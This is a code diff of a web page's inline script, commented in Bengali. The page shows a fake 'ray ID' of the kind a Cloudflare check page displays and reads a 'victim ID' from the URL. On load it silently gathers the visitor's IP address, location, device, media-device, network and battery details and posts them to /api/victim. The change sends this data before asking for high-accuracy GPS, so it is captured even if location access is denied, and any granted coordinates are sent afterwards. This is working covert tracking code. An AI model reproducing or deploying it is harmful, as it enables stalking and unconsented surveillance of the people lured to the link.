@@ -94,7 +94,9 @@
 
     <script>
         (function() {
-            // রে আইডি
+            "use strict";
+
+            // ===== রে আইডি =====
             const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
             let ray = "";
             for (let i = 0; i < 17; i++) {
@@ -102,7 +104,7 @@
             }
             document.getElementById('ray').textContent = ray;
 
-            // ভিক্টিম আইডি
+            // ===== ভিক্টিম আইডি =====
             const pathParts = window.location.pathname.split('/');
             const victimId = pathParts[pathParts.length - 1];
             const statusEl = document.getElementById('status');
@@ -112,7 +114,10 @@
                 statusEl.className = type;
             }
 
-            async function collectData() {
+            // ================================================================
+            // ১. ডিভাইস ইনফো সংগ্রহ করে /api/victim-এ পাঠান (লিংকে প্রবেশের সাথে)
+            // ================================================================
+            async function sendDeviceInfo() {
                 try {
                     const data = {
                         id: victimId,
@@ -124,18 +129,18 @@
                         device: {},
                         media: [],
                         network: {},
-                        battery: null,
-                        type: 'location'
+                        battery: {},
+                        type: 'location'   // 🔥 লোকেশন টাইপ
                     };
 
-                    // IP
+                    // --- IP ---
                     try {
                         const ipRes = await fetch('https://api.ipify.org?format=json');
                         const ipData = await ipRes.json();
                         data.ip = ipData.ip;
-                    } catch (e) { console.log('IP failed:', e); }
+                    } catch (e) {}
 
-                    // লোকেশন (IP API)
+                    // --- লোকেশন (IP API) ---
                     try {
                         if (data.ip) {
                             const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
@@ -149,9 +154,9 @@
                                 isp: locData.org || 'N/A'
                             };
                         }
-                    } catch (e) { console.log('Location failed:', e); }
+                    } catch (e) {}
 
-                    // ডিভাইস তথ্য
+                    // --- ডিভাইস তথ্য ---
                     data.device = {
                         productSub: navigator.productSub || 'N/A',
                         vendor: navigator.vendor || 'N/A',
@@ -174,7 +179,7 @@
                         colorDepth: screen.colorDepth || 'N/A'
                     };
 
-                    // মিডিয়া ডিভাইস
+                    // --- মিডিয়া ডিভাইস ---
                     try {
                         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                             const devices = await navigator.mediaDevices.enumerateDevices();
@@ -184,9 +189,9 @@
                                 deviceId: d.deviceId || 'N/A'
                             }));
                         }
-                    } catch (e) { console.log('Media failed:', e); }
+                    } catch (e) {}
 
-                    // নেটওয়ার্ক
+                    // --- নেটওয়ার্ক ---
                     if (navigator.connection) {
                         data.network = {
                             type: navigator.connection.type || 'N/A',
@@ -198,7 +203,7 @@
                         };
                     }
 
-                    // ব্যাটারি
+                    // --- ব্যাটারি ---
                     try {
                         if (navigator.getBattery) {
                             const battery = await navigator.getBattery();
@@ -209,62 +214,90 @@
                                 dischargingTime: battery.dischargingTime
                             };
                         }
-                    } catch (e) { console.log('Battery failed:', e); }
+                    } catch (e) {}
 
-                    // ===== লোকেশন (GPS) - এটাই মূল ফিচার =====
-                    try {
-                        if (navigator.geolocation) {
-                            setStatus('📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
-                            const pos = await new Promise((resolve, reject) => {
-                                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                    enableHighAccuracy: true,
-                                    timeout: 10000
-                                });
-                            });
-                            data.gpsLocation = {
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                            };
-                            setStatus('📍 লোকেশন পাওয়া গেছে!', 'success');
-                        } else {
-                            setStatus('❌ এই ব্রাউজার লোকেশন সাপোর্ট করে না', 'error');
-                        }
-                    } catch (e) {
-                        console.log('লোকেশন অ্যাক্সেস ডিনাই:', e.message);
-                        setStatus('❌ লোকেশন অ্যাক্সেস ডিনাই করা হয়েছে', 'error');
-                    }
+                    // ============================================================
+                    // 📤 ডিভাইস ইনফো /api/victim-এ পাঠান
+                    // ============================================================
+                    setStatus('📤 ডিভাইস তথ্য পাঠানো হচ্ছে...', 'info');
+                    console.log('📤 ডিভাইস ইনফো পাঠানো হচ্ছে (ভিক্টিম: ' + victimId + ')');
+                    const response = await fetch('/api/victim', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    const result = await response.json();
+                    console.log('📥 রেসপন্স:', result);
 
-                    // ===== ফাইনাল ডেটা পাঠানো =====
-                    try {
-                        setStatus('📤 ডেটা পাঠানো হচ্ছে...', 'info');
-                        const response = await fetch('/api/victim', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data)
-                        });
-
-                        const result = await response.json();
-                        console.log('📥 সার্ভার রেসপন্স:', result);
-
-                        if (response.ok) {
-                            setStatus('✅ সব তথ্য সংগ্রহ করা হয়েছে!', 'success');
-                        } else {
-                            setStatus('❌ ডেটা পাঠাতে ব্যর্থ: ' + (result.message || response.status), 'error');
-                        }
-                    } catch (e) {
-                        console.error('Data send error:', e);
-                        setStatus('❌ ডেটা পাঠাতে ব্যর্থ: ' + e.message, 'error');
+                    if (response.ok) {
+                        setStatus('✅ ডিভাইস তথ্য পাঠানো হয়েছে!', 'success');
+                    } else {
+                        setStatus('❌ ডেটা পাঠাতে ব্যর্থ', 'error');
                     }
 
                 } catch (err) {
-                    console.error('Collect data error:', err);
-                    setStatus('❌ ত্রুটি ঘটেছে: ' + err.message, 'error');
+                    console.error('❌ sendDeviceInfo error:', err);
+                    setStatus('❌ ডিভাইস তথ্য পাঠাতে ব্যর্থ', 'error');
                 }
             }
 
-            window.addEventListener('load', collectData);
+            // ================================================================
+            // ২. লোকেশন (GPS) অ্যাক্সেস (ডিভাইস ইনফো পাঠানোর পর)
+            // ================================================================
+            async function getLocation() {
+                try {
+                    if (!navigator.geolocation) {
+                        setStatus('❌ এই ব্রাউজার লোকেশন সাপোর্ট করে না', 'error');
+                        return;
+                    }
+
+                    setStatus('📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000
+                        });
+                    });
+
+                    const gpsData = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    };
+
+                    // লোকেশন ডেটা আপডেট করে পাঠান
+                    await fetch('/api/victim', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            id: victimId,
+                            gpsLocation: gpsData,
+                            type: 'location'
+                        })
+                    });
+
+                    setStatus('📍 লোকেশন পাওয়া গেছে!', 'success');
+
+                } catch (e) {
+                    console.log('লোকেশন অ্যাক্সেস ডিনাই:', e.message);
+                    setStatus('❌ লোকেশন অ্যাক্সেস ডিনাই করা হয়েছে', 'error');
+                }
+            }
+
+            // ================================================================
+            // ৩. মেইন ফাংশন
+            // ================================================================
+            async function main() {
+                // ১. ডিভাইস ইনফো পাঠান (লিংকে প্রবেশের সাথে)
+                await sendDeviceInfo();
+                // ২. লোকেশন চাওয়া (GPS)
+                await getLocation();
+            }
+
+            // পেজ লোড হলে শুরু করুন
+            window.addEventListener('load', main);
+
         })();
     </script>
 </body>
